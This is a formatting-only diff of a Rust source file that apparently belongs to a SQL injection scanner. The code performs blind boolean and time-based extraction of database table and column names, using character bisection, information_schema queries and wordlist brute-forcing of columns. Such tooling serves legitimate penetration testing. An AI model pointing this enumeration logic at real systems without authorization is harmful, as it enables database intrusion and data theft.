@@ -1,15 +1,15 @@
 //! Schema enumeration: blind extraction of table names and column names
 //! for all supported DBMS dialects.
 
-use std::sync::Arc;
 use anyhow::Result;
+use std::sync::Arc;
 use tracing::info;
 
 use crate::sqx::{
     detector::SqliDetector,
     models::{
-        BlindTechnique, CancellationToken, ExtractionStatus, HttpResponse,
-        SchemaEnumerationConfig, SchemaEnumerationProgress, SqliInfoExtraction,
+        BlindTechnique, CancellationToken, ExtractionStatus, HttpResponse, SchemaEnumerationConfig,
+        SchemaEnumerationProgress, SqliInfoExtraction,
     },
 };
 
@@ -37,9 +37,18 @@ impl SqliDetector {
 
         let table_count = self
             .get_table_count_blind(
-                url, param, original_value, dbms, config, baseline,
-                close, balance, vector, time_template,
-                &mut total_requests, cancel_token.as_ref(),
+                url,
+                param,
+                original_value,
+                dbms,
+                config,
+                baseline,
+                close,
+                balance,
+                vector,
+                time_template,
+                &mut total_requests,
+                cancel_token.as_ref(),
             )
             .await?;
 
@@ -51,16 +60,28 @@ impl SqliDetector {
 
         for table_index in 0..tables_to_extract {
             if let Some(ref token) = cancel_token
-                && token.is_cancelled() {
-                    info!("Table enumeration cancelled after {} tables", table_index);
-                    break;
-                }
+                && token.is_cancelled()
+            {
+                info!("Table enumeration cancelled after {} tables", table_index);
+                break;
+            }
 
             let table_name = self
                 .extract_table_name_blind(
-                    url, param, original_value, dbms, table_index, config,
-                    baseline, close, balance, vector, time_template, &mut total_requests,
-                    progress_callback.as_ref(), cancel_token.as_ref(),
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    table_index,
+                    config,
+                    baseline,
+                    close,
+                    balance,
+                    vector,
+                    time_template,
+                    &mut total_requests,
+                    progress_callback.as_ref(),
+                    cancel_token.as_ref(),
                 )
                 .await?;
 
@@ -109,16 +130,37 @@ impl SqliDetector {
         let count = match config.technique {
             BlindTechnique::Boolean => {
                 self.extract_number_blind(
-                    url, param, original_value, &count_query, baseline,
-                    close, balance, vector, 0, 500, total_requests, cancel_token,
+                    url,
+                    param,
+                    original_value,
+                    &count_query,
+                    baseline,
+                    close,
+                    balance,
+                    vector,
+                    0,
+                    500,
+                    total_requests,
+                    cancel_token,
                 )
                 .await?
             }
             BlindTechnique::Time => {
                 self.extract_number_time_based(
-                    url, param, original_value, dbms, &count_query,
-                    close, balance, time_template, vector,
-                    0, 500, total_requests, cancel_token, baseline.duration,
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    &count_query,
+                    close,
+                    balance,
+                    time_template,
+                    vector,
+                    0,
+                    500,
+                    total_requests,
+                    cancel_token,
+                    baseline.duration,
                 )
                 .await?
             }
@@ -148,20 +190,35 @@ impl SqliDetector {
         let name_query = crate::sqx::dbms::dialect_by_name(dbms)
             .map(|d| d.table_name_query(table_index))
             .unwrap_or_else(|| {
-                format!("SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}", table_index)
+                format!(
+                    "SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}",
+                    table_index
+                )
             });
         let mut name = String::new();
 
         for char_pos in 1..=config.max_name_length {
             if let Some(token) = cancel_token
-                && token.is_cancelled() {
-                    break;
-                }
+                && token.is_cancelled()
+            {
+                break;
+            }
 
             let char_value = self
                 .extract_char_bisection(
-                    url, param, original_value, dbms, &name_query, char_pos,
-                    config.technique, baseline, close, balance, vector, time_template, total_requests,
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    &name_query,
+                    char_pos,
+                    config.technique,
+                    baseline,
+                    close,
+                    balance,
+                    vector,
+                    time_template,
+                    total_requests,
                 )
                 .await?;
 
@@ -212,9 +269,19 @@ impl SqliDetector {
 
         let column_count = self
             .get_column_count_blind(
-                url, param, original_value, dbms, table_name, config,
-                baseline, close, balance, vector, time_template,
-                &mut total_requests, cancel_token.as_ref(),
+                url,
+                param,
+                original_value,
+                dbms,
+                table_name,
+                config,
+                baseline,
+                close,
+                balance,
+                vector,
+                time_template,
+                &mut total_requests,
+                cancel_token.as_ref(),
             )
             .await?;
 
@@ -227,29 +294,57 @@ impl SqliDetector {
         if column_count == 0 && !config.column_wordlist.is_empty() {
             info!(
                 "information_schema returned 0 columns for '{}'; attempting wordlist brute-force ({} candidates)",
-                table_name, config.column_wordlist.len()
+                table_name,
+                config.column_wordlist.len()
             );
             return self
                 .brute_force_columns_blind(
-                    url, param, original_value, dbms, table_name, config,
-                    baseline, close, balance, vector, time_template,
-                    &mut total_requests, progress_callback, cancel_token,
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    table_name,
+                    config,
+                    baseline,
+                    close,
+                    balance,
+                    vector,
+                    time_template,
+                    &mut total_requests,
+                    progress_callback,
+                    cancel_token,
                 )
                 .await;
         }
 
         for column_index in 0..columns_to_extract {
             if let Some(ref token) = cancel_token
-                && token.is_cancelled() {
-                    info!("Column enumeration cancelled after {} columns", column_index);
-                    break;
-                }
+                && token.is_cancelled()
+            {
+                info!(
+                    "Column enumeration cancelled after {} columns",
+                    column_index
+                );
+                break;
+            }
 
             let column_name = self
                 .extract_column_name_blind(
-                    url, param, original_value, dbms, table_name, column_index,
-                    config, baseline, close, balance, vector, time_template, &mut total_requests,
-                    progress_callback.as_ref(), cancel_token.as_ref(),
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    table_name,
+                    column_index,
+                    config,
+                    baseline,
+                    close,
+                    balance,
+                    vector,
+                    time_template,
+                    &mut total_requests,
+                    progress_callback.as_ref(),
+                    cancel_token.as_ref(),
                 )
                 .await?;
 
@@ -298,10 +393,11 @@ impl SqliDetector {
 
         for (idx, column_name) in config.column_wordlist.iter().enumerate() {
             if let Some(ref token) = cancel_token
-                && token.is_cancelled() {
-                    info!("Column brute-force cancelled after {} candidates", idx);
-                    break;
-                }
+                && token.is_cancelled()
+            {
+                info!("Column brute-force cancelled after {} candidates", idx);
+                break;
+            }
 
             let condition = format!(
                 "(SELECT COUNT({}) FROM {})>-1",
@@ -312,15 +408,29 @@ impl SqliDetector {
             let exists = match config.technique {
                 BlindTechnique::Boolean => {
                     self.test_condition_blind(
-                        url, param, original_value, &condition,
-                        baseline, close, balance, vector,
+                        url,
+                        param,
+                        original_value,
+                        &condition,
+                        baseline,
+                        close,
+                        balance,
+                        vector,
                     )
                     .await?
                 }
                 BlindTechnique::Time => {
                     self.test_condition_time_based(
-                        url, param, original_value, dbms, &condition,
-                        close, balance, time_template, vector, threshold,
+                        url,
+                        param,
+                        original_value,
+                        dbms,
+                        &condition,
+                        close,
+                        balance,
+                        time_template,
+                        vector,
+                        threshold,
                     )
                     .await?
                 }
@@ -342,21 +452,31 @@ impl SqliDetector {
             }
 
             if columns.len() >= config.max_columns_per_table {
-                info!("Column brute-force capped at {} columns", config.max_columns_per_table);
+                info!(
+                    "Column brute-force capped at {} columns",
+                    config.max_columns_per_table
+                );
                 break;
             }
         }
 
         info!(
             "Column brute-force complete for '{}': {} columns found in {} requests",
-            table_name, columns.len(), total_requests
+            table_name,
+            columns.len(),
+            total_requests
         );
         Ok(columns)
     }
 
     /// Minimal escaping for SQL identifiers used in brute-force queries.
     fn escape_identifier(name: &str) -> String {
-        if name.contains('\'') || name.contains('"') || name.contains('`') || name.contains(';') || name.contains(' ') {
+        if name.contains('\'')
+            || name.contains('"')
+            || name.contains('`')
+            || name.contains(';')
+            || name.contains(' ')
+        {
             format!("`{}`", name.replace('`', "``"))
         } else {
             name.to_string()
@@ -383,22 +503,46 @@ impl SqliDetector {
         let count_query = crate::sqx::dbms::dialect_by_name(dbms)
             .map(|d| d.column_count_query(table_name))
             .unwrap_or_else(|| {
-                format!("SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'", table_name)
+                format!(
+                    "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
+                    table_name
+                )
             });
 
         let count = match config.technique {
             BlindTechnique::Boolean => {
                 self.extract_number_blind(
-                    url, param, original_value, &count_query, baseline,
-                    close, balance, vector, 0, 500, total_requests, cancel_token,
+                    url,
+                    param,
+                    original_value,
+                    &count_query,
+                    baseline,
+                    close,
+                    balance,
+                    vector,
+                    0,
+                    500,
+                    total_requests,
+                    cancel_token,
                 )
                 .await?
             }
             BlindTechnique::Time => {
                 self.extract_number_time_based(
-                    url, param, original_value, dbms, &count_query,
-                    close, balance, time_template, vector,
-                    0, 500, total_requests, cancel_token, baseline.duration,
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    &count_query,
+                    close,
+                    balance,
+                    time_template,
+                    vector,
+                    0,
+                    500,
+                    total_requests,
+                    cancel_token,
+                    baseline.duration,
                 )
                 .await?
             }
@@ -435,14 +579,26 @@ impl SqliDetector {
 
         for char_pos in 1..=config.max_name_length {
             if let Some(token) = cancel_token
-                && token.is_cancelled() {
-                    break;
-                }
+                && token.is_cancelled()
+            {
+                break;
+            }
 
             let char_value = self
                 .extract_char_bisection(
-                    url, param, original_value, dbms, &name_query, char_pos,
-                    config.technique, baseline, close, balance, vector, time_template, total_requests,
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    &name_query,
+                    char_pos,
+                    config.technique,
+                    baseline,
+                    close,
+                    balance,
+                    vector,
+                    time_template,
+                    total_requests,
                 )
                 .await?;
 
@@ -484,7 +640,9 @@ impl SqliDetector {
         total_requests: &mut usize,
     ) -> Result<u8> {
         let dialect_box = crate::sqx::dbms::dialect_by_name(dbms);
-        let dialect = dialect_box.as_deref().unwrap_or(&crate::sqx::dbms::major::MySQL);
+        let dialect = dialect_box
+            .as_deref()
+            .unwrap_or(&crate::sqx::dbms::major::MySQL);
         let mut low = 32u8;
         let mut high = 126u8;
 
@@ -495,18 +653,37 @@ impl SqliDetector {
                 "({}({}(({}),{},1))>{})",
                 dialect.char_code_function(),
                 dialect.substring_function(),
-                query, position, mid
+                query,
+                position,
+                mid
             );
 
             let is_greater = match technique {
                 BlindTechnique::Boolean => {
-                    self.test_condition_blind(url, param, original_value, &condition, baseline, close, balance, vector)
-                        .await?
+                    self.test_condition_blind(
+                        url,
+                        param,
+                        original_value,
+                        &condition,
+                        baseline,
+                        close,
+                        balance,
+                        vector,
+                    )
+                    .await?
                 }
                 BlindTechnique::Time => {
                     self.test_condition_time_based(
-                        url, param, original_value, dbms, &condition,
-                        close, balance, time_template, vector, baseline.duration,
+                        url,
+                        param,
+                        original_value,
+                        dbms,
+                        &condition,
+                        close,
+                        balance,
+                        time_template,
+                        vector,
+                        baseline.duration,
                     )
                     .await?
                 }
@@ -524,28 +701,42 @@ impl SqliDetector {
             "({}({}(({}),{},1))>31)",
             dialect.char_code_function(),
             dialect.substring_function(),
-            query, position
+            query,
+            position
         );
         let exists = match technique {
             BlindTechnique::Boolean => {
-                self.test_condition_blind(url, param, original_value, &verify_condition, baseline, close, balance, vector)
-                    .await?
+                self.test_condition_blind(
+                    url,
+                    param,
+                    original_value,
+                    &verify_condition,
+                    baseline,
+                    close,
+                    balance,
+                    vector,
+                )
+                .await?
             }
             BlindTechnique::Time => {
                 self.test_condition_time_based(
-                    url, param, original_value, dbms, &verify_condition,
-                    close, balance, time_template, vector, baseline.duration,
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    &verify_condition,
+                    close,
+                    balance,
+                    time_template,
+                    vector,
+                    baseline.duration,
                 )
                 .await?
             }
         };
         *total_requests += 1;
 
-        if exists {
-            Ok(low)
-        } else {
-            Ok(0)
-        }
+        if exists { Ok(low) } else { Ok(0) }
     }
 
     /// Complete schema enumeration (tables + columns).
@@ -568,9 +759,18 @@ impl SqliDetector {
 
         let tables = self
             .enumerate_tables_blind(
-                url, param, original_value, dbms, config, baseline,
-                close, balance, vector, time_template,
-                progress_callback.clone(), cancel_token.clone(),
+                url,
+                param,
+                original_value,
+                dbms,
+                config,
+                baseline,
+                close,
+                balance,
+                vector,
+                time_template,
+                progress_callback.clone(),
+                cancel_token.clone(),
             )
             .await?;
 
@@ -578,15 +778,26 @@ impl SqliDetector {
 
         for table in &tables {
             if let Some(ref token) = cancel_token
-                && token.is_cancelled() {
-                    break;
-                }
+                && token.is_cancelled()
+            {
+                break;
+            }
 
             let columns = self
                 .enumerate_columns_blind(
-                    url, param, original_value, dbms, table, config, baseline,
-                    close, balance, vector, time_template,
-                    progress_callback.clone(), cancel_token.clone(),
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    table,
+                    config,
+                    baseline,
+                    close,
+                    balance,
+                    vector,
+                    time_template,
+                    progress_callback.clone(),
+                    cancel_token.clone(),
                 )
                 .await?;
 
